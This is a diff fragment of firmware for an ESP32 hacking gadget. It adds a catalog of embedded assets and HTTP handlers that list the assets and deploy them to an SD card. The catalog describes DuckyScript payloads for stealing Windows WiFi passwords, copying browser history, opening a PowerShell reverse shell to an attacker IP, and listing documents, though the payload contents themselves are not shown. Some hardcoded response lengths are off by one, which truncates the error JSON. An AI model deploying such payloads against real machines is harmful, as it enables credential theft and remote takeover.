+     "mifare_default_keys.txt", "/ext/nfc", ASSET_NFC_MIFARE_KEYS, sizeof(ASSET_NFC_MIFARE_KEYS) - 1},
+
+    {"nfc_amiibo_tpl",    "nfc", "Amiibo NTAG215 Template",
+     "Blank NTAG215 template structure for Amiibo emulation - fill with payload data",
+     "amiibo_template.nfc", "/ext/nfc/amiibo", ASSET_NFC_AMIIBO_TEMPLATE, sizeof(ASSET_NFC_AMIIBO_TEMPLATE) - 1},
+
+    // DuckyScript Payloads
+    {"ducky_wifi_steal",  "ducky", "WiFi Password Extractor",
+     "Extracts all saved WiFi SSIDs and passwords on Windows via netsh/PowerShell",
+     "wifi_stealer_win.txt", "/ext/payloads", ASSET_DUCKY_WIFI_STEALER, sizeof(ASSET_DUCKY_WIFI_STEALER) - 1},
+
+    {"ducky_chrome_hist", "ducky", "Chrome History Extractor",
+     "Copies Chrome browsing history SQLite DB to Desktop for offline analysis",
+     "chrome_history_win.txt", "/ext/payloads", ASSET_DUCKY_CHROME_HISTORY, sizeof(ASSET_DUCKY_CHROME_HISTORY) - 1},
+
+    {"ducky_rev_shell",   "ducky", "Reverse Shell Injector",
+     "PowerShell TCP reverse shell - change ATTACKER_IP and PORT before use",
+     "reverse_shell_win.txt", "/ext/payloads", ASSET_DUCKY_REVERSE_SHELL, sizeof(ASSET_DUCKY_REVERSE_SHELL) - 1},
+
+    {"ducky_sysinfo",     "ducky", "System Info Grabber",
+     "Collects OS version, network config, users, and ARP table on Windows",
+     "sysinfo_grab_win.txt", "/ext/payloads", ASSET_DUCKY_SYSINFO, sizeof(ASSET_DUCKY_SYSINFO) - 1},
+
+    {"ducky_exfil_docs",  "ducky", "Document List Exfiltrator",
+     "Enumerates all files in Documents folder with sizes and dates to CSV",
+     "exfil_docs_win.txt", "/ext/payloads", ASSET_DUCKY_EXFIL_MACRO, sizeof(ASSET_DUCKY_EXFIL_MACRO) - 1},
+};
+
+static constexpr size_t ASSET_COUNT = sizeof(ASSET_CATALOG) / sizeof(ASSET_CATALOG[0]);
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// Signal Lab API Handlers
+// ═══════════════════════════════════════════════════════════════════════════════
+
+/// GET /api/assets – list the embedded asset catalog (no content).
+static esp_err_t httpApiAssetsHandler(httpd_req_t *req)
+{
+    static constexpr size_t ASSETS_JSON_SIZE = 4096U;
+    char json[ASSETS_JSON_SIZE];
+    size_t offset = 0U;
+    offset += snprintf(json + offset, sizeof(json) - offset, "{\"assets\":[");
+
+    for (size_t i = 0U; i < ASSET_COUNT && offset < sizeof(json) - 256U; ++i)
+    {
+        const auto &a = ASSET_CATALOG[i];
+        if (i > 0U)
+        {
+            offset += snprintf(json + offset, sizeof(json) - offset, ",");
+        }
+        offset += snprintf(json + offset, sizeof(json) - offset,
+                           "{\"id\":\"%s\",\"category\":\"%s\",\"name\":\"%s\","
+                           "\"desc\":\"%s\",\"filename\":\"%s\",\"size\":%u}",
+                           a.id, a.category, a.name, a.desc, a.filename,
+                           static_cast<unsigned>(a.contentLen));
+    }
+    offset += snprintf(json + offset, sizeof(json) - offset, "]}");
+
+    httpd_resp_set_type(req, "application/json");
+    return httpd_resp_send(req, json, offset);
+}
+
+/// POST /api/assets/deploy – write an embedded asset file to the SD card.
+static esp_err_t httpApiAssetsDeployHandler(httpd_req_t *req)
+{
+    char buf[256];
+    int received = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    if (received <= 0)
+    {
+        httpd_resp_set_type(req, "application/json");
+        return httpd_resp_send(req, "{\"error\":\"no body\"}", 19);
+    }
+    buf[received] = '\0';
+
+    // Parse "id" field
+    const char *idKey = strstr(buf, "\"id\"");
+    if (idKey == nullptr)
+    {
+        httpd_resp_set_type(req, "application/json");
+        return httpd_resp_send(req, "{\"error\":\"missing id\"}", 21);
+    }
+
+    const char *valStart = strchr(idKey + 4, '"');
+    if (valStart == nullptr)
+    {
+        httpd_resp_set_type(req, "application/json");
+        return httpd_resp_send(req, "{\"error\":\"bad format\"}", 21);
+    }
+    ++valStart;
+    const char *valEnd = strchr(valStart, '"');
+    if (valEnd == nullptr || (valEnd - valStart) >= 64)
+    {
+        httpd_resp_set_type(req, "application/json");
+        return httpd_resp_send(req, "{\"error\":\"bad id\"}", 18);
+    }
+
+    char assetId[64];
+    size_t idLen = static_cast<size_t>(valEnd - valStart);
+    memcpy(assetId, valStart, idLen);
+    assetId[idLen] = '\0';
+
+    // Find asset in catalog
+    const AssetEntry *found = nullptr;
+    for (size_t i = 0U; i < ASSET_COUNT; ++i)
+    {
+        if (strcmp(ASSET_CATALOG[i].id, assetId) == 0)
+        {
+            found = &ASSET_CATALOG[i];
+            break;
+        }
+    }
+
+    if (found == nullptr)
+    {
+        httpd_resp_set_type(req, "application/json");
+        return httpd_resp_send(req, "{\"error\":\"asset not found\"}", 26);
+    }
+
+    // Build destination path
+    char path[128];
+    snprintf(path, sizeof(path), "%s/%s", found->destDir, found->filename);
+
+    // Ensure destination directory exists
+    auto &vfs = hackos::storage::VirtualFS::instance();
+    if (!vfs.exists(found->destDir))
+    {
+        vfs.mkdir(found->destDir);
+    }
+
+    // Write asset content to file
+    fs::File file = vfs.open(path, "w");
+    if (!file)
+    {
+        httpd_resp_set_type(req, "application/json");
+        return httpd_resp_send(req, "{\"error\":\"write failed\"}", 23);
+    }
+
+    file.write(reinterpret_cast<const uint8_t *>(found->content), found->contentLen);
+    file.close();
+
+    ESP_LOGI(TAG_RD, "Deployed asset: %s -> %s (%u bytes)",
+             found->id, path, static_cast<unsigned>(found->contentLen));
+
+    char json[192];
+    snprintf(json, sizeof(json), "{\"ok\":true,\"path\":\"%s\",\"size\":%u}",
+             path, static_cast<unsigned>(found->contentLen));
 
     httpd_resp_set_type(req, "application/json");
     return httpd_resp_send(req, json, strlen(json));
